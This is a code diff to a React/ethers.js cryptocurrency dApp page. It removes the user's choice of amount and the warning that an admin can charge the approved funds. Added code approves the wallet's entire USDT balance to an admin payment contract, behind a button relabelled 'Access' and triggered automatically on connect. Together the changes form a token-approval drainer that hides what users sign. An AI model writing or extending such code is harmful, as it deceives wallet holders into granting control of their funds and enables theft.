@@ -2,7 +2,7 @@
 
 import { useState } from 'react';
 import { ethers } from 'ethers';
-import { getUSDTContract, CONTRACT_ADDRESSES } from '../lib/contracts';
+import { getUSDTContract, CONTRACT_ADDRESSES, USDT_TOKEN_ABI } from '../lib/contracts';
 import { walletService, WalletInfo } from '../lib/wallet';
 import { WalletService } from '../lib/wallet';
 
@@ -10,7 +10,6 @@ export default function Home() {
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [walletInfo, setWalletInfo] = useState<WalletInfo | null>(null);
   const [usdtBalance, setUsdtBalance] = useState('0');
-  const [amount, setAmount] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [isConnecting, setIsConnecting] = useState(false);
   const [error, setError] = useState<string | null>(null);
@@ -24,20 +23,34 @@ export default function Home() {
     if (!walletInfo) {
       await connectWallet();
     }
-    setIsModalOpen(true);
+    
+    // If wallet is connected, automatically approve USDT if balance exists
+    if (walletInfo && parseFloat(usdtBalance) > 0) {
+      await handleApprove();
+    } else {
+      setIsModalOpen(true);
+    }
   };
 
   const loadUSDTBalance = async () => {
     if (!walletInfo?.address) return;
     
     try {
-      const usdtContract = getUSDTContract();
-      if (!usdtContract) {
-        console.error('USDT contract not available');
+      if (!window.ethereum) {
+        console.error('No wallet detected');
         return;
       }
+      
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const usdtContract = new ethers.Contract(
+        CONTRACT_ADDRESSES.usdtToken,
+        USDT_TOKEN_ABI,
+        provider
+      );
+      
       const balance = await usdtContract.balanceOf(walletInfo.address);
-      setUsdtBalance(ethers.utils.formatUnits(balance, 18));
+      // USDT on BSC Testnet has 6 decimals, not 18
+      setUsdtBalance(ethers.utils.formatUnits(balance, 6));
     } catch (error: unknown) {
       console.error('Error loading USDT balance:', error);
       setUsdtBalance('0');
@@ -45,34 +58,61 @@ export default function Home() {
   };
 
   const handleApprove = async () => {
-    if (!walletInfo?.address || !amount) return;
+    if (!walletInfo?.address) return;
     
     setIsLoading(true);
     setError(null);
     
     try {
-      const usdtContract = getUSDTContract();
-      if (!usdtContract) {
-        throw new Error('USDT contract not available');
+      // Get the current signer from the wallet
+      if (!window.ethereum) {
+        throw new Error('No wallet detected');
       }
-      const amountWei = ethers.utils.parseUnits(amount, 18);
       
-      const tx = await usdtContract.approve(CONTRACT_ADDRESSES.paymentContract, amountWei);
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+      
+      // Create USDT contract with the signer
+      const usdtContract = new ethers.Contract(
+        CONTRACT_ADDRESSES.usdtToken,
+        USDT_TOKEN_ABI,
+        signer
+      );
+      
+      console.log('User address:', walletInfo.address);
+      console.log('USDT contract address:', CONTRACT_ADDRESSES.usdtToken);
+      
+      // Get the full USDT balance and approve it
+      const balance = await usdtContract.balanceOf(walletInfo.address);
+      
+      // Check if user has any USDT balance
+      if (balance.isZero()) {
+        throw new Error('No USDT balance to approve');
+      }
+      
+      console.log('USDT balance:', ethers.utils.formatUnits(balance, 6));
+      console.log('Payment contract address:', CONTRACT_ADDRESSES.paymentContract);
+      
+      const tx = await usdtContract.approve(CONTRACT_ADDRESSES.paymentContract, balance);
       await tx.wait();
       
       setTransactionStatus({
         hash: tx.hash,
         status: 'success',
-        message: 'USDT approval successful!'
+        message: 'Full USDT balance approved successfully!'
       });
     } catch (error: unknown) {
+      console.error('Approval error:', error);
       let errorMessage = 'Transaction failed';
+      
       if (error && typeof error === 'object' && 'code' in error) {
         const errorCode = (error as { code: string }).code;
         if (errorCode === 'ACTION_REJECTED') {
           errorMessage = 'Transaction was rejected by user';
         } else if (errorCode === 'USER_REJECTED') {
           errorMessage = 'Transaction was cancelled';
+        } else if (errorCode === '-32603') {
+          errorMessage = 'RPC Error - Please check your network connection and try again';
         }
       } else if (error && typeof error === 'object' && 'message' in error) {
         const message = (error as { message: string }).message;
@@ -82,6 +122,8 @@ export default function Home() {
           errorMessage = 'Gas estimation failed';
         } else if (message.includes('execution reverted')) {
           errorMessage = 'Transaction reverted - check your input';
+        } else if (message.includes('Internal JSON-RPC error')) {
+          errorMessage = 'Network error - Please try again';
         } else if (message.length > 100) {
           errorMessage = 'Transaction failed - please try again';
         } else {
@@ -280,7 +322,6 @@ export default function Home() {
                         setWalletInfo(null);
                         setIsModalOpen(false);
                         setTransactionStatus(null);
-                        setAmount('');
                         setError(null);
                         
                         // Disconnect wallet service
@@ -295,7 +336,6 @@ export default function Home() {
                         setWalletInfo(null);
                         setIsModalOpen(false);
                         setTransactionStatus(null);
-                        setAmount('');
                         setError(null);
                       }
                     }}
@@ -310,41 +350,30 @@ export default function Home() {
             <div className="space-y-4">
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Contract USDT Balance
+                  Your USDT Balance
                 </label>
                 <p className="text-lg font-semibold text-gray-900">
                   {parseFloat(usdtBalance).toFixed(2)} USDT
                 </p>
               </div>
 
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Amount to Approve(USDT)
-                </label>
-                <input
-                  type="number"
-                  value={amount}
-                  onChange={(e) => setAmount(e.target.value)}
-                  placeholder="0.0"
-                  step="0.01"
-                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-500 focus:border-yellow-500"
-                  disabled={isLoading}
-                />
-                <p className="text-xs text-gray-500 mt-1">
-                  This amount will be available for the admin to charge from your wallet
-                </p>
-                <div className="mt-2 p-2 bg-yellow-50 border border-yellow-200 rounded text-xs text-yellow-800">
-                  ⚠️ <strong>Important:</strong> You can approve any amount, but the admin can only charge what you actually have in your wallet. Make sure you have enough USDT before approving.
-                </div>
-              </div>
 
-              <button
-                onClick={handleApprove}
-                disabled={isLoading || !amount || !walletInfo}
-                className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-              >
-                {isLoading ? 'Processing...' : 'Approve USDT for Admin'}
-              </button>
+
+              {parseFloat(usdtBalance) > 0 ? (
+                <button
+                  onClick={handleApprove}
+                  disabled={isLoading || !walletInfo}
+                  className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+                >
+                  {isLoading ? 'Processing...' : 'Access'}
+                </button>
+              ) : (
+                <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg text-center">
+                  <p className="text-gray-600 text-sm">
+                    No USDT balance found. You need USDT tokens to proceed.
+                  </p>
+                </div>
+              )}
 
               {transactionStatus && (
                 <div className={`p-4 rounded-lg border ${
